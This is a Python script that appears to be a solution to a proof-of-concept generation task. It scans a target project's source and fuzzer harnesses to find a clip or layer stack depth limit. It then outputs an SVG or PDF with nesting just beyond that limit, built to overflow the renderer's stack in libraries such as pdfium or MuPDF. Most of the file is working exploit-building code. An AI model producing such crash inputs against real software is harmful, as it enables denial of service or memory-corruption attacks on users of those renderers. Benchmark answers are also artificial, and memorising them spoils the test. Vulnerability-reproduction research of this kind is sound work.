import os
import re
import tarfile
import tempfile
import shutil
import ast
from typing import Optional, Tuple, List, Dict


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".inl", ".ipp",
    ".m", ".mm", ".java", ".rs", ".go", ".py", ".js", ".ts",
}
_MAX_READ = 3 * 1024 * 1024


def _is_within_directory(directory: str, target: str) -> bool:
    directory = os.path.abspath(directory)
    target = os.path.abspath(target)
    try:
        common = os.path.commonpath([directory, target])
    except ValueError:
        return False
    return common == directory


def _safe_extract(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            continue
        tar.extract(member, path=path)


def _maybe_single_subdir_root(root: str) -> str:
    try:
        entries = [e for e in os.listdir(root) if e not in (".", "..")]
    except OSError:
        return root
    if len(entries) != 1:
        return root
    one = os.path.join(root, entries[0])
    if os.path.isdir(one):
        return one
    return root


def _read_text_file(path: str, max_bytes: int = _MAX_READ) -> Optional[str]:
    try:
        st = os.stat(path)
        if st.st_size <= 0:
            return ""
        if st.st_size > max_bytes:
            return None
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            return None
        return data.decode("utf-8", errors="ignore")
    except OSError:
        return None


def _walk_files(root: str, only_likely: bool = False) -> List[str]:
    res = []
    skip_dirs = {".git", ".hg", ".svn", "out", "build", "cmake-build-debug", "cmake-build-release"}
    for dirpath, dirnames, filenames in os.walk(root):
        dn = os.path.basename(dirpath)
        if dn in skip_dirs:
            dirnames[:] = []
            continue
        if only_likely:
            low = dirpath.lower()
            if not any(k in low for k in ("fuzz", "fuzzer", "oss-fuzz", "ossfuzz", "tests", "test")):
                continue
        for fn in filenames:
            ext = os.path.splitext(fn)[1].lower()
            if ext in _TEXT_EXTS:
                res.append(os.path.join(dirpath, fn))
    return res


def _find_fuzzer_harnesses(root: str) -> List[Tuple[str, str]]:
    harnesses: List[Tuple[str, str]] = []
    files = _walk_files(root, only_likely=True)
    if not files:
        files = _walk_files(root, only_likely=False)
    for p in files:
        txt = _read_text_file(p)
        if not txt:
            continue
        if "LLVMFuzzerTestOneInput" in txt or "FuzzerTestOneInput" in txt:
            harnesses.append((p, txt))
    return harnesses


def _score_formats_from_text(txt: str) -> Dict[str, int]:
    t = txt
    tl = t.lower()
    score = {"svg": 0, "pdf": 0, "json": 0, "unknown": 0}

    if "sksvg" in t or "SkSVG" in t or "svgdom" in tl or "svg" in tl:
        score["svg"] += 5
    if "rsvg_handle_new_from_data" in tl or "librsvg" in tl:
        score["svg"] += 5
    if "xmlreadmemory" in tl and "svg" in tl:
        score["svg"] += 2

    if "FPDF_LoadMemDocument" in t or "pdfium" in tl:
        score["pdf"] += 7
    if "fz_open_document" in t or "mupdf" in tl:
        score["pdf"] += 7
    if "%pdf" in tl or "pdf" in tl:
        score["pdf"] += 2
    if "qpdf" in tl:
        score["pdf"] += 2

    if "nlohmann::json" in t or "rapidjson" in tl or "json" in tl:
        score["json"] += 2
    if "skottie" in tl or "lottie" in tl:
        score["json"] += 7

    return score


def _detect_format(root: str) -> str:
    # Fast path by known directory structure.
    if os.path.isdir(os.path.join(root, "modules", "svg")) or os.path.isdir(os.path.join(root, "modules", "svg", "src")):
        return "svg"
    if os.path.isdir(os.path.join(root, "third_party", "librsvg")):
        return "svg"
    if os.path.isdir(os.path.join(root, "pdfium")) or os.path.isdir(os.path.join(root, "core", "fxcrt")):
        # pdfium-ish
        return "pdf"

    harnesses = _find_fuzzer_harnesses(root)
    if harnesses:
        agg = {"svg": 0, "pdf": 0, "json": 0, "unknown": 0}
        for _, txt in harnesses:
            sc = _score_formats_from_text(txt)
            for k, v in sc.items():
                agg[k] += v
        best = max(agg.items(), key=lambda kv: kv[1])[0]
        if agg[best] > 0:
            return best

    # Heuristic scan for indicative headers
    for p in _walk_files(root, only_likely=True)[:200]:
        txt = _read_text_file(p)
        if not txt:
            continue
        sc = _score_formats_from_text(txt)
        best = max(sc.items(), key=lambda kv: kv[1])[0]
        if sc[best] >= 5:
            return best

    return "svg"


_ALLOWED_AST_NODES = (
    ast.Expression, ast.BinOp, ast.UnaryOp, ast.Num, ast.Constant,
    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod,
    ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor,
    ast.UAdd, ast.USub, ast.Invert, ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
)


def _safe_eval_int_expr(expr: str) -> Optional[int]:
    if expr is None:
        return None
    e = expr.strip()
    if not e:
        return None
    e = re.sub(r"//.*", "", e)
    e = re.sub(r"/\*.*?\*/", "", e, flags=re.DOTALL)
    e = e.strip()
    if not e:
        return None
    # Remove common casts
    e = re.sub(r"\bstatic_cast\s*<[^>]*>\s*\(", "(", e)
    e = re.sub(r"\breinterpret_cast\s*<[^>]*>\s*\(", "(", e)
    e = re.sub(r"\bconst_cast\s*<[^>]*>\s*\(", "(", e)
    e = re.sub(r"\bdynamic_cast\s*<[^>]*>\s*\(", "(", e)
    # Remove integer suffixes
    e = re.sub(r"(\d+)\s*[uUlL]+\b", r"\1", e)
    # Remove digit separators
    e = e.replace("'", "").replace("_", "")
    # Reject if contains suspicious characters/identifiers
    if re.search(r"[A-Za-z]", e):
        return None
    if re.search(r"[^0-9\s\(\)\+\-\*/%<>\|\&\^~]", e):
        return None
    try:
        node = ast.parse(e, mode="eval")
    except SyntaxError:
        return None

    def _check(n: ast.AST) -> bool:
        for child in ast.walk(n):
            if not isinstance(child, _ALLOWED_AST_NODES):
                return False
            if isinstance(child, ast.Call) or isinstance(child, ast.Name) or isinstance(child, ast.Attribute):
                return False
        return True

    if not _check(node):
        return None
    try:
        v = eval(compile(node, "<expr>", "eval"), {"__builtins__": {}}, {})
    except Exception:
        return None
    if isinstance(v, bool):
        return int(v)
    if isinstance(v, int):
        return v
    if isinstance(v, float) and v.is_integer():
        return int(v)
    return None


def _extract_candidates_from_text(txt: str) -> List[Tuple[int, int]]:
    # Returns list of (value, score)
    candidates: List[Tuple[int, int]] = []

    kw_focus = ("clip", "layer", "stack", "depth", "nest", "mark", "save", "restore")
    txtl = txt.lower()

    def score_name(name: str) -> int:
        n = name.lower()
        s = 0
        if "max" in n:
            s += 4
        if "depth" in n or "stack" in n:
            s += 4
        if "clip" in n:
            s += 3
        if "layer" in n:
            s += 3
        if "nest" in n:
            s += 2
        if "mark" in n:
            s += 1
        if "limit" in n:
            s += 2
        return s

    # #define NAME expr
    for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+?)\s*$", txt, flags=re.MULTILINE):
        name = m.group(1)
        expr = m.group(2)
        if not any(k in name.lower() for k in ("max", "depth", "stack", "nest", "clip", "layer", "limit")):
            continue
        v = _safe_eval_int_expr(expr)
        if v is None:
            continue
        if 8 <= v <= 500000:
            candidates.append((v, score_name(name)))

    # constexpr/const NAME = expr;
    for m in re.finditer(
        r"\b(?:static\s+)?(?:constexpr|const)\s+(?:unsigned\s+)?(?:int|size_t|uint32_t|uint16_t|uint64_t|long|short)\s+"
        r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^;]+);",
        txt,
        flags=re.MULTILINE,
    ):
        name = m.group(1)
        expr = m.group(2)
        if not any(k in name.lower() for k in ("max", "depth", "stack", "nest", "clip", "layer", "limit")):
            continue
        v = _safe_eval_int_expr(expr)
        if v is None:
            continue
        if 8 <= v <= 500000:
            candidates.append((v, score_name(name)))

    # enum { NAME = expr, ... };
    for m in re.finditer(r"\benum\b[^{}]*\{([^}]+)\}", txt, flags=re.DOTALL):
        body = m.group(1)
        for mm in re.finditer(r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^,}]+)", body):
            name = mm.group(1)
            expr = mm.group(2)
            if not any(k in name.lower() for k in ("max", "depth", "stack", "nest", "clip", "layer", "limit")):
                continue
            v = _safe_eval_int_expr(expr)
            if v is None:
                continue
            if 8 <= v <= 500000:
                candidates.append((v, score_name(name)))

    # Numeric array sizes in lines with clip/layer/stack terms
    for line in txt.splitlines():
        ll = line.lower()
        if not any(k in ll for k in ("stack", "depth", "nest")):
            continue
        if not any(k in ll for k in ("clip", "layer")):
            continue
        for m in re.finditer(r"\[\s*(\d{2,6})\s*\]", line):
            v = int(m.group(1))
            if 8 <= v <= 500000:
                s = 1
                for k in kw_focus:
                    if k in ll:
                        s += 1
                candidates.append((v, s))

    # If any "layer/clip stack" nearby, add some bonus to all candidates found in same file later by selecting best overall elsewhere.
    if "layer/clip" in txtl or "layer clip" in txtl:
        candidates = [(v, s + 2) for (v, s) in candidates]
    if "clip mark" in txtl or "clipmark" in txtl:
        candidates = [(v, s + 2) for (v, s) in candidates]

    return candidates


def _extract_depth_limit(root: str, prefer_dirs: Optional[List[str]] = None) -> Optional[int]:
    keywords = (
        "layer/clip stack",
        "layer clip stack",
        "layerclip",
        "clip mark",
        "clipmark",
        "nesting depth",
        "nestingdepth",
        "fNestingDepth",
        "clip stack",
        "layer stack",
    )

    search_roots = []
    if prefer_dirs:
        for d in prefer_dirs:
            p = os.path.join(root, d)
            if os.path.isdir(p):
                search_roots.append(p)
    if not search_roots:
        search_roots = [root]

    best_val = None
    best_score = -1

    for sr in search_roots:
        for dirpath, dirnames, filenames in os.walk(sr):
            dn = os.path.basename(dirpath)
            if dn in (".git", ".hg", ".svn", "out", "build"):
                dirnames[:] = []
                continue
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in _TEXT_EXTS:
                    continue
                fp = os.path.join(dirpath, fn)
                txt = _read_text_file(fp)
                if txt is None:
                    continue
                if not txt:
                    continue
                tl = txt.lower()
                if not any(k in tl for k in keywords):
                    continue
                cands = _extract_candidates_from_text(txt)
                for v, s in cands:
                    if s > best_score:
                        best_score = s
                        best_val = v

    return best_val


def _build_svg_poc(depth: int) -> bytes:
    if depth < 1:
        depth = 1
    # Minimal, valid SVG with deep nested clip usage.
    prefix = (
        '<?xml version="1.0"?>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" viewBox="0 0 1 1">'
        '<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
    ).encode("utf-8")
    open_tag = b'<g clip-path="url(#c)">'
    close_tag = b"</g>"
    mid = b'<rect width="1" height="1"/>'
    suffix = b"</svg>"
    return b"".join([prefix, open_tag * depth, mid, close_tag * depth, suffix])


def _build_pdf_poc(depth: int) -> bytes:
    if depth < 1:
        depth = 1
    # Content: deep q + clip nesting to overflow clip/layer stack.
    # Each level: q 0 0 1 1 re W n
    per = b"q 0 0 1 1 re W n\n"
    content = per * depth + b"0 0 1 1 re f\n" + (b"Q\n" * depth)

    # PDF objects
    objs: List[bytes] = []
    objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")
    objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R /Resources << >> >>")
    stream_obj = b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream"
    objs.append(stream_obj)

    out = bytearray()
    out.extend(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
    offsets = [0]
    for i, obj in enumerate(objs, start=1):
        offsets.append(len(out))
        out.extend(f"{i} 0 obj\n".encode("ascii"))
        out.extend(obj)
        out.extend(b"\nendobj\n")

    xref_pos = len(out)
    out.extend(b"xref\n")
    out.extend(f"0 {len(objs)+1}\n".encode("ascii"))
    out.extend(b"0000000000 65535 f \n")
    for i in range(1, len(objs) + 1):
        out.extend(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
    out.extend(b"trailer\n")
    out.extend(f"<< /Size {len(objs)+1} /Root 1 0 R >>\n".encode("ascii"))
    out.extend(b"startxref\n")
    out.extend(f"{xref_pos}\n".encode("ascii"))
    out.extend(b"%%EOF\n")
    return bytes(out)


def _pick_prefer_dirs(root: str, fmt: str) -> List[str]:
    if fmt == "svg":
        for cand in ("modules/svg", "module/svg", "svg", "src/svg", "lib/svg"):
            if os.path.isdir(os.path.join(root, cand)):
                return [cand]
        return ["modules", "src", ""]
    if fmt == "pdf":
        for cand in ("pdf", "src/pdf", "renderer/pdf", "pdfium", "mupdf", "third_party/mupdf"):
            if os.path.isdir(os.path.join(root, cand)):
                return [cand]
        return ["src", ""]
    if fmt == "json":
        for cand in ("modules/skottie", "skottie", "src/skottie", "lottie"):
            if os.path.isdir(os.path.join(root, cand)):
                return [cand]
        return ["src", ""]
    return [""]


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        root = src_path
        if os.path.isfile(src_path):
            tmpdir = tempfile.mkdtemp(prefix="poc_src_")
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    _safe_extract(tar, tmpdir)
                root = _maybe_single_subdir_root(tmpdir)
            except Exception:
                if tmpdir:
                    shutil.rmtree(tmpdir, ignore_errors=True)
                tmpdir = None
                root = src_path
        elif os.path.isdir(src_path):
            root = src_path

        try:
            fmt = _detect_format(root)
            prefer_dirs = _pick_prefer_dirs(root, fmt)
            limit = _extract_depth_limit(root, prefer_dirs=prefer_dirs)

            if limit is None:
                # Conservative defaults that avoid extreme recursion but still likely exceed typical fixed stacks.
                if fmt == "pdf":
                    depth = 50000
                elif fmt == "svg":
                    depth = 5000
                else:
                    depth = 5000
            else:
                depth = int(limit) + 8
                if depth < 64:
                    depth = 128

            if fmt == "pdf":
                return _build_pdf_poc(depth)
            # If json, fallback to svg-like XML is probably wrong; but we do svg unless explicit json support exists.
            return _build_svg_poc(depth)
        finally:
            if tmpdir:
                shutil.rmtree(tmpdir, ignore_errors=True)